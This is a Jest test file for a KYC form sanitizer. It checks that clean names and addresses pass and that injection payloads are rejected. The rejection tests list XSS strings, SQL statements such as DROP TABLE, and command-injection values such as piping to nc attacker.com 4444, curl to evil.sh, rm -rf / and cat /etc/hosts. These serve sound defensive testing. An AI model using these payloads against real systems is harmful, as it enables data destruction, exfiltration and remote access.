/**
 * Automated tests for the KYC sanitizer (issue #1973).
 *
 * Verifies that malicious injection payloads are rejected and clean
 * input is sanitized safely, per the issue's acceptance criteria.
 */

import {
  SanitizationError,
  containsHtmlTag,
  containsSqlInjection,
  detectThreats,
  kycSanitizeBody,
  sanitizeKycPayload,
  sanitizeKycString,
} from "../kycSanitizer";

describe("kycSanitizer (#1973)", () => {
  describe("clean input passes through", () => {
    it.each([
      ["first_name", "Ada"],
      ["last_name", "Lovelace-O'Neil"],
      ["address", "12B Byron Road, apt 4"],
      ["id_number", "AB1234567"],
      ["city", "Nairobi"],
      ["postal_code", "00100"],
    ])("accepts a normal %s value", (field, value) => {
      expect(sanitizeKycString(field, value as string)).toBeTruthy();
    });

    it("preserves apostrophes in names", () => {
      // A lone apostrophe in a name is valid human data - it must not be
      // treated as SQL injection on its own.
      expect(sanitizeKycString("last_name", "O'Brien")).toBe("O'Brien");
    });

    it("trims whitespace", () => {
      expect(sanitizeKycString("city", "  Lagos  ")).toBe("Lagos");
    });
  });

  describe("XSS payloads are rejected", () => {
    it.each([
      '<script>alert("xss")</script>',
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>",
      "hello<iframe src='javascript:alert(1)'></iframe>",
      "<b>bold</b>",
      "John <a href='http://evil.com'>link</a>",
    ])("rejects %s", (payload) => {
      expect(containsHtmlTag(payload)).toBe(true);
      expect(() => sanitizeKycString("first_name", payload)).toThrow(
        SanitizationError,
      );
    });
  });

  describe("SQL injection payloads are rejected", () => {
    it.each([
      "admin' OR 1=1 --",
      "'; DROP TABLE users; --",
      "1 UNION SELECT * FROM users",
      "n' UNION ALL SELECT * FROM kyc_applicants--",
      "x'; DELETE FROM users WHERE 1=1--",
      "Robert'); DROP TABLE students;--",
    ])("rejects %s", (payload) => {
      expect(containsSqlInjection(payload)).toBe(true);
      expect(() => sanitizeKycString("first_name", payload)).toThrow(
        SanitizationError,
      );
    });
  });

  describe("command injection payloads are rejected", () => {
    it.each([
      "name; cat /etc/hosts",
      "x`whoami`",
      "value && rm -rf /",
      "data | nc attacker.com 4444",
      "addr\ncurl http://evil.sh",
    ])("rejects %s", (payload) => {
      expect(() => sanitizeKycString("address", payload)).toThrow(
        SanitizationError,
      );
    });
  });

  describe("resource-safety limits", () => {
    it("rejects fields exceeding the maximum length", () => {
      const big = "a".repeat(5001);
      expect(() => sanitizeKycString("address", big)).toThrow(
        SanitizationError,
      );
    });

    it("handles pathological '<A A A ...' input in linear time", () => {
      // Regression guard for the polynomial-regex class flagged by CodeQL:
      // this input must be classified instantly, not via backtracking.
      const evilInput = "<" + "A ".repeat(100000);
      const start = Date.now();
      expect(containsHtmlTag(evilInput)).toBe(true);
      expect(() => sanitizeKycString("first_name", evilInput)).toThrow(
        SanitizationError,
      );
      // Generous bound: a linear scan finishes in milliseconds; a
      // backtracking regex would take far longer on this input.
      expect(Date.now() - start).toBeLessThan(2000);
    });
  });

  describe("detectThreats", () => {
    it("classifies each threat category", () => {
      expect(detectThreats("<script>")).toContain("html_tag");
      expect(detectThreats("' OR 1=1 --")).toContain("sql_injection");
      expect(detectThreats("x;shutdown")).toContain("command_injection");
      expect(detectThreats("clean value")).toEqual([]);
    });
  });

  describe("sanitizeKycPayload", () => {
    it("sanitizes nested objects and arrays", () => {
      const payload = {
        first_name: "Ada",
        address: { street: "1 Way", lines: ["a", "b"] },
      };
      const out = sanitizeKycPayload(payload);
      expect(out).toEqual(payload);
    });

    it("throws with the offending field name", () => {
      const payload = {
        first_name: "Ada",
        last_name: "<script>alert(1)</script>",
      };
      try {
        sanitizeKycPayload(payload);
        throw new Error("expected SanitizationError");
      } catch (err) {
        expect(err).toBeInstanceOf(SanitizationError);
        expect((err as SanitizationError).field).toBe("last_name");
      }
    });

    it("leaves numbers and booleans untouched", () => {
      expect(sanitizeKycPayload({ n: 5, ok: true, nil: null })).toEqual({
        n: 5,
        ok: true,
        nil: null,
      });
    });
  });

  describe("kycSanitizeBody middleware", () => {
    function makeRes() {
      const res: any = {};
      res.status = jest.fn(() => res);
      res.json = jest.fn(() => res);
      return res;
    }

    it("sanitizes req.body and calls next", () => {
      const req: any = { body: { first_name: "Ada", city: "Accra" } };
      const res = makeRes();
      const next = jest.fn();

      kycSanitizeBody(req, res, next);

      expect(next).toHaveBeenCalled();
      expect(req.body).toEqual({ first_name: "Ada", city: "Accra" });
    });

    it("returns 400 for a malicious payload without calling next", () => {
      const req: any = { body: { first_name: "<img src=x onerror=alert(1)>" } };
      const res = makeRes();
      const next = jest.fn();

      kycSanitizeBody(req, res, next);

      expect(next).not.toHaveBeenCalled();
      expect(res.status).toHaveBeenCalledWith(400);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({ field: "first_name" }),
      );
    });
  });
});
